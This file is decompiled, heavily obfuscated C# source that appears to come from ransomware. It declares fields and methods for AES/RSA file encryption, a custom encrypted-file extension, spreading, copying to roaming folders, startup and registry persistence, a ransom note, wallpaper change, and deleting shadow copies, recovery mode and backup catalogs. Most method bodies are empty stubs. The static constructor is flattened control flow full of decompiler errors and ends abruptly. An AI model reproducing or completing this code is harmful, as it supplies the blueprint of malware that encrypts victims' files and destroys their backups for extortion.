using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace ConsoleApplication7;

internal class Program_007B00AE12A8_002D7C7B_002D4C80_002DACF2_002D41FE01F22283_007D
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp;

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr intptr_0);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr intptr_0, IntPtr intptr_1);

		static NativeMethods()
		{
			Class0.smethod_13();
			intpreclp = new IntPtr(-3);
		}
	}

	private static string userName;

	private static string userDir;

	public static string appMutexRun;

	public static bool encryptionAesRsa;

	public static string encryptedFileExtension;

	private static bool checkSpread;

	private static string spreadName;

	private static bool checkCopyRoaming;

	private static string processName;

	public static string appMutexRun2;

	private static bool checkStartupFolder;

	private static bool checkSleep;

	private static int sleepTextbox;

	private static string string_0;

	public static string appMutexStartup;

	private static string droppedMessageTextbox;

	private static bool checkAdminPrivilage;

	private static bool checkdeleteShadowCopies;

	private static bool checkdisableRecoveryMode;

	private static bool checkdeleteBackupCatalog;

	public static string appMutexStartup2;

	public static string appMutex2;

	public static string staticSplit;

	public static string appMutex;

	public static readonly Regex appMutexRegex;

	private static string[] messages;

	private static string[] validExtensions;

	private static Random random;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_1, uint uint_2);

	private static void Main(string[] string_1)
	{
	}

	public static void Run()
	{
	}

	private static void sleepOutOfTempFolder()
	{
	}

	public static byte[] random_bytes(int int_0)
	{
		return null;
	}

	public static string RandomString(int int_0)
	{
		return null;
	}

	public static string RandomStringForExtension(int int_0)
	{
		return null;
	}

	public static string Base64EncodeString(string string_1)
	{
		return null;
	}

	public static string randomEncode(string string_1)
	{
		return null;
	}

	private static void encryptDirectory(string string_1)
	{
	}

	public static string rsaKey()
	{
		return null;
	}

	public static string CreatePassword(int int_0)
	{
		return null;
	}

	public static byte[] AES_Encrypt(byte[] byte_0, byte[] byte_1)
	{
		return null;
	}

	public static void EncryptFile(string string_1)
	{
	}

	public static string smethod_0(string string_1, string string_2)
	{
		return null;
	}

	private static void lookForDirectories()
	{
	}

	private static void copyRoaming(string string_1)
	{
	}

	private static void copyResistForAdmin(string string_1)
	{
	}

	private static void addLinkToStartup()
	{
	}

	private static void addAndOpenNote()
	{
	}

	private static void registryStartup()
	{
	}

	private static void spreadIt(string string_1)
	{
	}

	private static void runCommand(string string_1)
	{
	}

	private static void deleteShadowCopies()
	{
	}

	private static void disableRecoveryMode()
	{
	}

	private static void deleteBackupCatalog()
	{
	}

	public static void SetWallpaper(string string_1)
	{
	}

	static Program_007B00AE12A8_002D7C7B_002D4C80_002DACF2_002D41FE01F22283_007D()
	{
		//IL_0021: Expected O, but got I4
		//IL_0050: Expected O, but got I4
		//IL_0083: Expected O, but got I4
		//IL_00b6: Expected O, but got I4
		//IL_00cd: Expected O, but got I4
		//IL_00f2: Expected O, but got I4
		//IL_0109: Expected O, but got I4
		//IL_0120: Expected O, but got I4
		//IL_0137: Expected O, but got I4
		//IL_016a: Expected O, but got I4
		//IL_019f: Expected O, but got I4
		//IL_01b9: Expected O, but got I4
		//IL_01dd: Expected O, but got I4
		//IL_0208: Expected O, but got I4
		//IL_024e: Expected O, but got I4
		//IL_0272: Expected O, but got I4
		//IL_029d: Expected O, but got I4
		//IL_02d9: Expected O, but got I4
		//IL_02f3: Expected O, but got I4
		//IL_031e: Expected O, but got I4
		//IL_035a: Expected O, but got I4
		//IL_0374: Expected O, but got I4
		//IL_038e: Expected O, but got I4
		//IL_03af: Expected O, but got I4
		//IL_03eb: Expected O, but got I4
		//IL_0427: Expected O, but got I4
		//IL_0441: Expected O, but got I4
		//IL_045b: Expected O, but got I4
		//IL_0475: Expected O, but got I4
		//IL_048f: Expected O, but got I4
		//IL_04c4: Expected O, but got I4
		//IL_04ef: Expected O, but got I4
		//IL_0509: Expected O, but got I4
		//IL_0523: Expected O, but got I4
		//IL_0545: Expected O, but got I4
		//IL_055d: Expected O, but got I4
		//IL_0572: Expected O, but got I4
		//IL_0598: Expected O, but got I4
		//IL_05af: Expected O, but got I4
		//IL_05d5: Expected O, but got I4
		//IL_05e9: Expected O, but got I4
		//IL_05ff: Expected O, but got I4
		//IL_0615: Expected O, but got I4
		//IL_0638: Expected O, but got I4
		//IL_064e: Expected O, but got I4
		//IL_0664: Expected O, but got I4
		//IL_06a2: Expected O, but got I4
		//IL_06c2: Expected O, but got I4
		//IL_06d4: Expected O, but got I4
		//IL_06f5: Expected O, but got I4
		//IL_0707: Expected O, but got I4
		//IL_073e: Expected O, but got I4
		//IL_075e: Expected O, but got I4
		//IL_0775: Expected O, but got I4
		//IL_0790: Expected O, but got I4
		//IL_07a2: Expected O, but got I4
		//IL_07c3: Expected O, but got I4
		//IL_07f6: Expected O, but got I4
		//IL_080d: Expected O, but got I4
		//IL_0833: Expected O, but got I4
		//IL_0858: Expected O, but got I4
		//IL_088c: Expected O, but got I4
		//IL_08e3: Expected O, but got I4
		//IL_08f9: Expected O, but got I4
		//IL_090a: Expected O, but got I4
		//IL_091b: Expected O, but got I4
		//IL_0946: Expected O, but got I4
		//IL_095f: Expected O, but got I4
		//IL_098f: Expected O, but got I4
		//IL_09a9: Expected O, but got I4
		//IL_09c3: Expected O, but got I4
		//IL_09ee: Expected O, but got I4
		//IL_0a2a: Expected O, but got I4
		//IL_0a5f: Expected O, but got I4
		//IL_0ab6: Expected O, but got I4
		//IL_0adc: Expected O, but got I4
		//IL_0af3: Expected O, but got I4
		//IL_0b0a: Expected O, but got I4
		//IL_0b59: Expected O, but got I4
		//IL_0b70: Expected O, but got I4
		//IL_0ba3: Expected O, but got I4
		//IL_0bba: Expected O, but got I4
		//IL_0bdf: Expected O, but got I4
		//IL_0bf6: Expected O, but got I4
		//IL_0c0d: Expected O, but got I4
		//IL_0c29: Expected O, but got I4
		//IL_0c3d: Expected O, but got I4
		//IL_0c4c: Expected O, but got I4
		//IL_0c78: Expected O, but got I4
		//IL_0c99: Expected O, but got I4
		//IL_0cd9: Expected O, but got I4
		//IL_0cfe: Expected O, but got I4
		//IL_0d15: Expected O, but got I4
		//IL_0d2c: Expected O, but got I4
		//IL_0d43: Expected O, but got I4
		//IL_0d5a: Expected O, but got I4
		//IL_0d71: Expected O, but got I4
		//IL_0d88: Expected O, but got I4
		//IL_0d9f: Expected O, but got I4
		//IL_0ddc: Expected O, but got I4
		//IL_0dfd: Expected O, but got I4
		//IL_0e22: Expected O, but got I4
		//IL_0e39: Expected O, but got I4
		//IL_0e50: Expected O, but got I4
		//IL_0e75: Expected O, but got I4
		//IL_0e8c: Expected O, but got I4
		//IL_0ea3: Expected O, but got I4
		//IL_0eba: Expected O, but got I4
		//IL_0ed1: Expected O, but got I4
		//IL_0eee: Expected O, but got I4
		//IL_0f0d: Expected O, but got I4
		//IL_0f27: Expected O, but got I4
		//IL_0f41: Expected O, but got I4
		//IL_0f8c: Expected O, but got I4
		//IL_0fc0: Expected O, but got I4
		//IL_0ff3: Expected O, but got I4
		//IL_100a: Expected O, but got I4
		//IL_1038: Expected O, but got I4
		//IL_104a: Expected O, but got I4
		//IL_10c2: Expected O, but got I4
		//IL_10da: Expected O, but got I4
		//IL_10e9: Expected O, but got I4
		//IL_1112: Expected O, but got I4
		//IL_112c: Expected O, but got I4
		//IL_1146: Expected O, but got I4
		//IL_1171: Expected O, but got I4
		//IL_119a: Expected O, but got I4
		//IL_11d6: Expected O, but got I4
		//IL_1203: Expected O, but got I4
		//IL_121a: Expected O, but got I4
		//IL_1238: Expected O, but got I4
		//IL_1269: Expected O, but got I4
		//IL_12a7: Expected O, but got I4
		//IL_12c1: Expected O, but got I4
		//IL_12ea: Expected O, but got I4
		//IL_1304: Expected O, but got I4
		//IL_1328: Expected O, but got I4
		//IL_1344: Expected O, but got I4
		//IL_1369: Expected O, but got I4
		//IL_13aa: Expected O, but got I4
		//IL_13c6: Expected O, but got I4
		//IL_141d: Expected O, but got I4
		//IL_145b: Expected O, but got I4
		//IL_147c: Expected O, but got I4
		//IL_1498: Expected O, but got I4
		//IL_14af: Expected O, but got I4
		//IL_14c6: Expected O, but got I4
		//IL_14e2: Expected O, but got I4
		//IL_150c: Expected O, but got I4
		//IL_1528: Expected O, but got I4
		//IL_1569: Expected O, but got I4
		//IL_1580: Expected O, but got I4
		//IL_15a6: Expected O, but got I4
		//IL_15c2: Expected O, but got I4
		//IL_15df: Expected O, but got I4
		//IL_15f7: Expected O, but got I4
		//IL_1606: Expected O, but got I4
		//IL_1615: Expected O, but got I4
		//IL_1634: Expected O, but got I4
		//IL_1664: Expected O, but got I4
		//IL_16b1: Expected O, but got I4
		//IL_16cb: Expected O, but got I4
		//IL_16ff: Expected O, but got I4
		//IL_1716: Expected O, but got I4
		//IL_172d: Expected O, but got I4
		//IL_1744: Expected O, but got I4
		//IL_175b: Expected O, but got I4
		//IL_178e: Expected O, but got I4
		//IL_17ca: Expected O, but got I4
		//IL_17e4: Expected O, but got I4
		//IL_180f: Expected O, but got I4
		//IL_182b: Expected O, but got I4
		//IL_1c6d: Expected I4, but got O
		//IL_1c89: Expected O, but got I4
		//IL_1caf: Expected O, but got I4
		//IL_1cc8: Expected O, but got I4
		//IL_1cdf: Expected O, but got I4
		//IL_1d04: Expected O, but got I4
		//IL_1d15: Expected O, but got I4
		//IL_1d39: Expected O, but got I4
		//IL_1d5d: Expected O, but got I4
		//IL_1d7c: Expected O, but got I4
		//IL_1d8f: Expected O, but got I4
		Class0.smethod_13();
		string[] array2 = default(string[]);
		while (Class0.smethod_9(40))
		{
			while (true)
			{
				userName = Environment.UserName;
				userDir = Class0.smethod_11(164);
				string[] array = (string[])10;
				while (true)
				{
					appMutexRun = Class0.smethod_11(168);
					array = (string[])118;
					while (true)
					{
						IL_1d06:
						encryptionAesRsa = true;
						array = (string[])164;
						if (!smethod_2())
						{
							goto IL_1830;
						}
						goto IL_1ced;
						IL_1ced:
						array2[22] = Class0.smethod_11(352);
						array = (string[])263;
						goto IL_1c98;
						IL_1c98:
						array2[23] = Class0.smethod_11(356);
						array = (string[])193;
						goto IL_1c72;
						IL_1c72:
						array2[24] = Class0.smethod_11(360);
						array = (string[])152;
						if (smethod_2())
						{
							goto IL_000a;
						}
						goto IL_1830;
						IL_000a:
						array2[78] = Class0.smethod_11(576);
						array = (string[])138;
						if (!smethod_2())
						{
							goto IL_002b;
						}
						goto IL_06ac;
						IL_06ac:
						array[8] = Class0.smethod_11(224);
						array = (string[])211;
						goto IL_06c2;
						IL_06c2:
						array[9] = "";
						array = (string[])132;
						if (!smethod_1())
						{
							goto IL_0234;
						}
						goto IL_1830;
						IL_0234:
						array2[142] = Class0.smethod_11(832);
						array = (string[])266;
						if (smethod_1())
						{
							goto IL_0258;
						}
						goto IL_1444;
						IL_1444:
						array2[26] = Class0.smethod_11(368);
						array = (string[])145;
						if (!smethod_2())
						{
							goto IL_1465;
						}
						goto IL_17e4;
						IL_17e4:
						array2[132] = Class0.smethod_11(792);
						goto IL_17f5;
						IL_17f5:
						array2[133] = Class0.smethod_11(796);
						array = (string[])113;
						goto IL_0174;
						IL_0174:
						array2[134] = Class0.smethod_11(800);
						goto IL_0185;
						IL_0185:
						array2[135] = Class0.smethod_11(804);
						array = (string[])130;
						goto IL_019f;
						IL_019f:
						array2[136] = Class0.smethod_11(808);
						array = (string[])106;
						if (smethod_1())
						{
							goto IL_01c3;
						}
						goto IL_0340;
						IL_0340:
						array2[154] = Class0.smethod_11(880);
						array = (string[])9;
						goto IL_035a;
						IL_035a:
						array2[155] = Class0.smethod_11(884);
						array = (string[])18;
						goto IL_0374;
						IL_0374:
						array2[156] = Class0.smethod_11(888);
						array = (string[])243;
						if (smethod_2())
						{
							goto IL_031e;
						}
						goto IL_0395;
						IL_0395:
						array2[157] = Class0.smethod_11(892);
						array = (string[])163;
						goto IL_03af;
						IL_03af:
						array2[158] = Class0.smethod_11(896);
						goto IL_03c0;
						IL_03c0:
						array2[159] = Class0.smethod_11(900);
						array2[160] = Class0.smethod_11(904);
						array = (string[])23;
						goto IL_03eb;
						IL_03eb:
						array2[161] = Class0.smethod_11(908);
						goto IL_03fc;
						IL_03fc:
						array2[162] = Class0.smethod_11(912);
						goto IL_040d;
						IL_040d:
						array2[163] = Class0.smethod_11(916);
						array = (string[])217;
						goto IL_0427;
						IL_0427:
						array2[164] = Class0.smethod_11(920);
						array = (string[])200;
						goto IL_0441;
						IL_0441:
						array2[165] = Class0.smethod_11(924);
						array = (string[])233;
						goto IL_045b;
						IL_045b:
						array2[166] = Class0.smethod_11(928);
						array = (string[])116;
						goto IL_0475;
						IL_0475:
						array2[167] = Class0.smethod_11(932);
						array = (string[])260;
						if (smethod_1())
						{
							goto IL_0499;
						}
						goto IL_0f27;
						IL_0f27:
						array2[212] = Class0.smethod_11(1112);
						array = (string[])174;
						if (!smethod_1())
						{
							goto IL_03c0;
						}
						goto IL_1830;
						IL_1830:
						while (true)
						{
							switch ((int)array)
							{
							case 253:
								break;
							case 138:
								goto IL_002b;
							case 87:
								goto IL_0050;
							default:
								goto IL_005e;
							case 0:
								goto IL_006c;
							case 219:
								goto IL_0083;
							case 85:
								goto IL_0091;
							case 139:
								goto IL_009f;
							case 259:
								goto IL_00b6;
							case 115:
								goto IL_00cd;
							case 68:
								goto IL_00db;
							case 64:
								goto IL_00f2;
							case 120:
								goto IL_0109;
							case 157:
								goto IL_0120;
							case 103:
								goto IL_0137;
							case 110:
								goto IL_0153;
							case 113:
								goto IL_0174;
							case 32:
								goto IL_0185;
							case 130:
								goto IL_019f;
							case 106:
								goto IL_01c3;
							case 136:
								goto IL_01dd;
							case 201:
								goto IL_01ee;
							case 247:
								goto IL_0212;
							case 63:
								goto IL_0223;
							case 76:
								goto IL_0234;
							case 266:
								goto IL_0258;
							case 185:
								goto IL_0272;
							case 262:
								goto IL_0283;
							case 237:
								goto IL_029d;
							case 209:
								goto IL_02ae;
							case 50:
								goto IL_02bf;
							case 34:
								goto IL_02d9;
							case 51:
								goto IL_02f3;
							case 55:
								goto IL_0304;
							case 252:
								goto IL_031e;
							case 205:
								goto IL_0340;
							case 9:
								goto IL_035a;
							case 18:
								goto IL_0374;
							case 243:
								goto IL_0395;
							case 163:
								goto IL_03af;
							case 236:
								goto IL_03c0;
							case 23:
								goto IL_03eb;
							case 225:
								goto IL_03fc;
							case 184:
								goto IL_040d;
							case 217:
								goto IL_0427;
							case 200:
								goto IL_0441;
							case 233:
								goto IL_045b;
							case 116:
								goto IL_0475;
							case 260:
								goto IL_0499;
							case 238:
								goto IL_04aa;
							case 39:
								goto IL_04c4;
							case 29:
								goto IL_04d5;
							case 90:
								goto IL_04ef;
							case 151:
								goto IL_0509;
							case 3:
								goto IL_052d;
							case 170:
								goto IL_0545;
							case 264:
								goto IL_055d;
							case 206:
								goto IL_0563;
							case 267:
								array[32] = Class0.smethod_11(256);
								array = (string[])160;
								goto case 160;
							case 160:
								array[33] = Class0.smethod_11(260);
								array = (string[])169;
								goto case 169;
							case 169:
								array[34] = Class0.smethod_11(264);
								goto case 135;
							case 135:
								array[35] = "";
								goto case 153;
							case 153:
								messages = array;
								array = (string[])47;
								goto case 47;
							case 47:
								array2 = new string[229];
								array = (string[])107;
								goto case 107;
							case 107:
								array2[0] = Class0.smethod_11(268);
								array = (string[])95;
								goto case 95;
							case 95:
								array2[1] = Class0.smethod_11(272);
								array = (string[])221;
								goto case 221;
							case 221:
								array2[2] = Class0.smethod_11(276);
								array2[3] = Class0.smethod_11(280);
								array = (string[])239;
								goto case 239;
							case 239:
								array2[4] = Class0.smethod_11(284);
								array = (string[])41;
								goto case 41;
							case 41:
								array2[5] = Class0.smethod_11(288);
								array = (string[])1;
								goto case 1;
							case 1:
								array2[6] = Class0.smethod_11(292);
								goto case 154;
							case 154:
								array2[7] = Class0.smethod_11(296);
								array2[8] = Class0.smethod_11(300);
								array2[9] = Class0.smethod_11(304);
								array = (string[])112;
								if (!smethod_2())
								{
									continue;
								}
								goto IL_06ac;
							case 28:
								goto IL_06ac;
							case 211:
								goto IL_06c2;
							case 265:
								array[19] = "";
								array = (string[])16;
								goto IL_06f5;
							case 16:
								goto IL_06f5;
							case 70:
								goto IL_0707;
							case 101:
								goto IL_0715;
							case 80:
								goto IL_071e;
							case 8:
								goto IL_073e;
							case 20:
								goto IL_074c;
							case 231:
								goto IL_075e;
							case 168:
								goto IL_0775;
							case 227:
								goto IL_077e;
							case 114:
								goto IL_0790;
							case 251:
								goto IL_07ac;
							case 129:
								goto IL_07c3;
							case 246:
								goto IL_07d1;
							case 94:
								goto IL_07f6;
							case 258:
								array2[16] = Class0.smethod_11(328);
								array = (string[])15;
								goto case 15;
							case 15:
								array2[17] = Class0.smethod_11(332);
								goto case 190;
							case 190:
								array2[18] = Class0.smethod_11(336);
								array = (string[])202;
								if (smethod_1())
								{
									continue;
								}
								goto case 221;
							case 257:
								array2[75] = Class0.smethod_11(564);
								goto case 161;
							case 161:
								array2[76] = Class0.smethod_11(568);
								array = (string[])108;
								if (!smethod_1())
								{
									goto case 2;
								}
								goto case 108;
							case 2:
								staticSplit = Class0.smethod_11(204);
								goto case 104;
							case 104:
								appMutex = staticSplit + appMutexStartup + appMutexRun;
								goto case 218;
							case 218:
								appMutexRegex = new Regex(Class0.smethod_11(208));
								goto case 38;
							case 38:
								array = new string[36];
								array = (string[])111;
								goto case 111;
							case 111:
								array[0] = Class0.smethod_11(212);
								array = (string[])14;
								goto case 14;
							case 14:
								array[1] = "";
								array = (string[])137;
								goto case 137;
							case 137:
								array[2] = "";
								array = (string[])53;
								goto case 53;
							case 53:
								array[3] = Class0.smethod_11(216);
								goto case 5;
							case 5:
								array[4] = "";
								goto case 78;
							case 78:
								array[5] = Class0.smethod_11(220);
								array = (string[])159;
								goto case 159;
							case 159:
								array[6] = "";
								goto case 158;
							case 158:
								array[7] = "";
								array = (string[])28;
								goto IL_06ac;
							case 256:
								array2[186] = Class0.smethod_11(1008);
								goto case 69;
							case 69:
								array2[187] = Class0.smethod_11(1012);
								array = (string[])73;
								goto case 73;
							case 73:
								array2[188] = Class0.smethod_11(1016);
								array = (string[])126;
								goto case 126;
							case 126:
								array2[189] = Class0.smethod_11(1020);
								array = (string[])37;
								goto case 37;
							case 37:
								array2[190] = Class0.smethod_11(1024);
								goto case 228;
							case 228:
								array2[191] = Class0.smethod_11(1028);
								array = (string[])171;
								goto case 171;
							case 171:
								array2[192] = Class0.smethod_11(1032);
								goto case 131;
							case 131:
								array2[193] = Class0.smethod_11(1036);
								goto case 74;
							case 74:
								array2[194] = Class0.smethod_11(1040);
								array = (string[])255;
								if (smethod_1())
								{
									goto case 255;
								}
								goto case 167;
							case 255:
								array2[195] = Class0.smethod_11(1044);
								array2[196] = Class0.smethod_11(1048);
								array = (string[])83;
								if (smethod_2())
								{
									goto IL_00f2;
								}
								goto case 83;
							case 83:
								array2[197] = Class0.smethod_11(1052);
								goto case 122;
							case 122:
								array2[198] = Class0.smethod_11(1056);
								goto case 52;
							case 52:
								array2[199] = Class0.smethod_11(1060);
								goto case 216;
							case 216:
								array2[200] = Class0.smethod_11(1064);
								array = (string[])180;
								if (smethod_1())
								{
									continue;
								}
								goto IL_02f3;
							case 250:
								array2[102] = Class0.smethod_11(672);
								array = (string[])124;
								goto case 124;
							case 124:
								array2[103] = Class0.smethod_11(676);
								array = (string[])182;
								goto case 182;
							case 182:
								array2[104] = Class0.smethod_11(680);
								array = (string[])12;
								goto case 12;
							case 12:
								array2[105] = Class0.smethod_11(684);
								array2[106] = Class0.smethod_11(688);
								array2[107] = Class0.smethod_11(692);
								goto case 208;
							case 208:
								array2[108] = Class0.smethod_11(696);
								goto case 7;
							case 7:
								array2[109] = Class0.smethod_11(700);
								array = (string[])117;
								goto case 117;
							case 117:
								array2[110] = Class0.smethod_11(704);
								array = (string[])134;
								goto case 134;
							case 134:
								array2[111] = Class0.smethod_11(708);
								goto case 44;
							case 44:
								array2[112] = Class0.smethod_11(712);
								array2[113] = Class0.smethod_11(716);
								array = (string[])119;
								goto case 119;
							case 119:
								array2[114] = Class0.smethod_11(720);
								array = (string[])210;
								goto case 210;
							case 210:
								array2[115] = Class0.smethod_11(724);
								goto case 147;
							case 147:
							case 162:
								array2[116] = Class0.smethod_11(728);
								array = (string[])197;
								goto case 197;
							case 197:
								array2[117] = Class0.smethod_11(732);
								array = (string[])93;
								goto case 93;
							case 93:
								array2[118] = Class0.smethod_11(736);
								array = (string[])146;
								if (!smethod_1())
								{
									goto case 187;
								}
								goto case 146;
							case 187:
								array[31] = "";
								array = (string[])267;
								goto case 267;
							case 248:
								checkdisableRecoveryMode = false;
								array = (string[])176;
								goto case 176;
							case 176:
								checkdeleteBackupCatalog = false;
								array = (string[])222;
								goto case 222;
							case 222:
								appMutexStartup2 = Class0.smethod_11(200);
								goto case 88;
							case 88:
								appMutex2 = appMutexStartup2 + appMutexRun2;
								array = (string[])2;
								if (smethod_1())
								{
									continue;
								}
								goto IL_0c82;
							case 220:
								goto IL_0c82;
							case 244:
								array2[32] = Class0.smethod_11(392);
								goto case 188;
							case 188:
								array2[33] = Class0.smethod_11(396);
								_ = 0;
								if (smethod_1())
								{
									array = (string[])100;
									goto case 91;
								}
								array = (string[])147;
								goto case 147;
							case 91:
							case 100:
								array2[34] = Class0.smethod_11(400);
								array2[35] = Class0.smethod_11(404);
								array = (string[])11;
								goto case 11;
							case 11:
								array2[36] = Class0.smethod_11(408);
								array = (string[])31;
								goto case 31;
							case 31:
								array2[37] = Class0.smethod_11(412);
								array = (string[])92;
								goto case 92;
							case 92:
								array2[38] = Class0.smethod_11(416);
								array = (string[])223;
								goto case 223;
							case 223:
								array2[39] = Class0.smethod_11(420);
								array = (string[])203;
								goto case 203;
							case 203:
								array2[40] = Class0.smethod_11(424);
								array = (string[])194;
								goto case 194;
							case 194:
								array2[41] = Class0.smethod_11(428);
								array = (string[])46;
								goto case 46;
							case 46:
								array2[42] = Class0.smethod_11(432);
								array = (string[])22;
								if (smethod_1())
								{
									goto case 22;
								}
								goto case 121;
							case 22:
								array2[43] = Class0.smethod_11(436);
								goto case 196;
							case 196:
								array2[44] = Class0.smethod_11(440);
								goto case 123;
							case 123:
								array2[45] = Class0.smethod_11(444);
								array = (string[])142;
								if (!smethod_2())
								{
									continue;
								}
								goto case 224;
							case 224:
								array2[63] = Class0.smethod_11(516);
								array = (string[])192;
								goto case 192;
							case 192:
								array2[64] = Class0.smethod_11(520);
								array2[65] = Class0.smethod_11(524);
								array = (string[])179;
								goto case 179;
							case 179:
								array2[66] = Class0.smethod_11(528);
								array = (string[])42;
								goto case 42;
							case 42:
								array2[67] = Class0.smethod_11(532);
								array = (string[])4;
								goto case 4;
							case 4:
								array2[68] = Class0.smethod_11(536);
								goto case 35;
							case 35:
								array2[69] = Class0.smethod_11(540);
								array = (string[])241;
								goto case 241;
							case 241:
								array2[70] = Class0.smethod_11(544);
								array = (string[])81;
								goto case 81;
							case 81:
								array2[71] = Class0.smethod_11(548);
								array = (string[])198;
								goto case 198;
							case 198:
								array2[72] = Class0.smethod_11(552);
								array = (string[])75;
								goto case 75;
							case 75:
								array2[73] = Class0.smethod_11(556);
								array = (string[])177;
								goto case 177;
							case 177:
								array2[74] = Class0.smethod_11(560);
								goto case 257;
							case 242:
								array2[210] = Class0.smethod_11(1104);
								array = (string[])149;
								goto case 149;
							case 149:
								array2[211] = Class0.smethod_11(1108);
								array = (string[])19;
								goto IL_0f27;
							case 19:
								goto IL_0f27;
							case 240:
								array2[183] = Class0.smethod_11(996);
								array2[184] = Class0.smethod_11(1000);
								goto case 40;
							case 40:
								array2[185] = Class0.smethod_11(1004);
								array = (string[])256;
								if (!smethod_2())
								{
									goto case 256;
								}
								goto case 83;
							case 235:
								array2[96] = Class0.smethod_11(648);
								array2[97] = Class0.smethod_11(652);
								array = (string[])89;
								goto case 89;
							case 89:
								array2[98] = Class0.smethod_11(656);
								array2[99] = Class0.smethod_11(660);
								goto case 165;
							case 165:
								array2[100] = Class0.smethod_11(664);
								array = (string[])77;
								goto case 77;
							case 77:
								array2[101] = Class0.smethod_11(668);
								array = (string[])250;
								goto case 250;
							case 234:
								array[13] = Class0.smethod_11(232);
								goto case 102;
							case 102:
								array[14] = "";
								goto case 25;
							case 25:
								array[15] = "";
								array = (string[])43;
								goto case 43;
							case 43:
								array[16] = "";
								array = (string[])17;
								if (!smethod_2())
								{
									continue;
								}
								goto case 21;
							case 21:
								array2[180] = Class0.smethod_11(984);
								goto case 230;
							case 230:
								array2[181] = Class0.smethod_11(988);
								goto case 148;
							case 148:
								array2[182] = Class0.smethod_11(992);
								goto case 240;
							case 232:
								array2[208] = Class0.smethod_11(1096);
								goto case 150;
							case 150:
								array2[209] = Class0.smethod_11(1100);
								goto case 242;
							case 226:
								checkSpread = true;
								array = (string[])213;
								goto case 213;
							case 213:
								spreadName = Class0.smethod_11(1200);
								array = (string[])66;
								goto case 66;
							case 66:
								checkCopyRoaming = true;
								array = (string[])254;
								if (!smethod_2())
								{
									continue;
								}
								goto case 134;
							case 215:
								array2[217] = Class0.smethod_11(1132);
								array = (string[])141;
								goto case 141;
							case 141:
								array2[218] = Class0.smethod_11(1136);
								array = (string[])56;
								goto case 56;
							case 56:
								array2[219] = Class0.smethod_11(1140);
								array = (string[])49;
								goto case 49;
							case 49:
								array2[220] = Class0.smethod_11(1144);
								array2[221] = Class0.smethod_11(1148);
								array = (string[])167;
								if (!smethod_2())
								{
									continue;
								}
								goto case 241;
							case 214:
								array2[175] = Class0.smethod_11(964);
								array = (string[])58;
								goto case 58;
							case 58:
								array2[176] = Class0.smethod_11(968);
								goto case 178;
							case 178:
								array2[177] = Class0.smethod_11(972);
								array2[178] = Class0.smethod_11(976);
								array = (string[])82;
								goto case 82;
							case 82:
								array2[179] = Class0.smethod_11(980);
								goto case 21;
							case 212:
								array2[52] = Class0.smethod_11(472);
								array = (string[])65;
								goto case 65;
							case 65:
								array2[53] = Class0.smethod_11(476);
								array = (string[])172;
								if (smethod_1())
								{
									goto case 172;
								}
								goto case 181;
							case 172:
								array2[54] = Class0.smethod_11(480);
								array = (string[])251;
								if (smethod_1())
								{
									goto IL_07ac;
								}
								goto case 60;
							case 60:
								array2[51] = Class0.smethod_11(468);
								goto case 212;
							case 181:
								array2[30] = Class0.smethod_11(384);
								array = (string[])67;
								goto case 67;
							case 67:
								array2[31] = Class0.smethod_11(388);
								goto case 244;
							case 207:
								array2[204] = Class0.smethod_11(1080);
								goto case 96;
							case 96:
								array2[205] = Class0.smethod_11(1084);
								array = (string[])173;
								goto case 173;
							case 173:
								array2[206] = Class0.smethod_11(1088);
								array = (string[])6;
								if (smethod_1())
								{
									continue;
								}
								break;
							case 195:
								array2[214] = Class0.smethod_11(1120);
								array = (string[])183;
								goto case 183;
							case 183:
								array2[215] = Class0.smethod_11(1124);
								array = (string[])26;
								if (smethod_1())
								{
									goto case 26;
								}
								goto case 125;
							case 26:
								array2[216] = Class0.smethod_11(1128);
								array = (string[])215;
								goto case 215;
							case 191:
								array2[60] = Class0.smethod_11(504);
								array = (string[])54;
								goto case 54;
							case 54:
								array2[61] = Class0.smethod_11(508);
								array2[62] = Class0.smethod_11(512);
								array = (string[])224;
								goto case 224;
							case 180:
								array2[201] = Class0.smethod_11(1068);
								goto case 127;
							case 127:
								array2[202] = Class0.smethod_11(1072);
								array2[203] = Class0.smethod_11(1076);
								array = (string[])207;
								goto case 207;
							case 175:
								array2[11] = Class0.smethod_11(312);
								array = (string[])99;
								goto case 99;
							case 99:
								array2[12] = Class0.smethod_11(160);
								goto case 97;
							case 97:
								array2[13] = Class0.smethod_11(316);
								goto case 27;
							case 27:
								array2[14] = Class0.smethod_11(320);
								array2[15] = Class0.smethod_11(324);
								goto case 258;
							case 174:
								array2[213] = Class0.smethod_11(1116);
								array = (string[])195;
								goto case 195;
							case 164:
								encryptedFileExtension = Class0.smethod_11(172);
								goto case 226;
							case 152:
								array2[25] = Class0.smethod_11(364);
								goto IL_1444;
							case 61:
								goto IL_1444;
							case 145:
								goto IL_1465;
							case 143:
								array2[48] = Class0.smethod_11(456);
								array = (string[])109;
								goto case 109;
							case 109:
								array2[49] = Class0.smethod_11(460);
								array = (string[])72;
								goto case 72;
							case 72:
								array2[50] = Class0.smethod_11(464);
								array = (string[])60;
								goto case 60;
							case 142:
								array2[46] = Class0.smethod_11(448);
								array = (string[])84;
								goto case 84;
							case 84:
								array2[47] = Class0.smethod_11(452);
								goto case 143;
							case 140:
								array2[174] = Class0.smethod_11(960);
								array = (string[])214;
								goto case 214;
							case 132:
								array[10] = Class0.smethod_11(228);
								array = (string[])45;
								goto case 45;
							case 45:
								array[11] = "";
								array[12] = "";
								goto case 234;
							case 112:
								array2[10] = Class0.smethod_11(308);
								goto case 175;
							case 105:
								array2[29] = Class0.smethod_11(380);
								array = (string[])181;
								goto case 181;
							case 24:
								array[18] = "";
								array = (string[])265;
								if (smethod_1())
								{
									goto case 265;
								}
								goto case 161;
							case 17:
								array[17] = Class0.smethod_11(236);
								array = (string[])24;
								goto case 24;
							case 6:
								array2[207] = Class0.smethod_11(1092);
								array = (string[])232;
								goto case 232;
							case 254:
								processName = Class0.smethod_11(1204);
								array = (string[])156;
								goto case 156;
							case 156:
								appMutexRun2 = Class0.smethod_11(184);
								array = (string[])229;
								goto case 229;
							case 229:
								checkStartupFolder = true;
								array = (string[])59;
								goto case 59;
							case 59:
								checkSleep = true;
								array = (string[])71;
								goto case 71;
							case 71:
								sleepTextbox = 10;
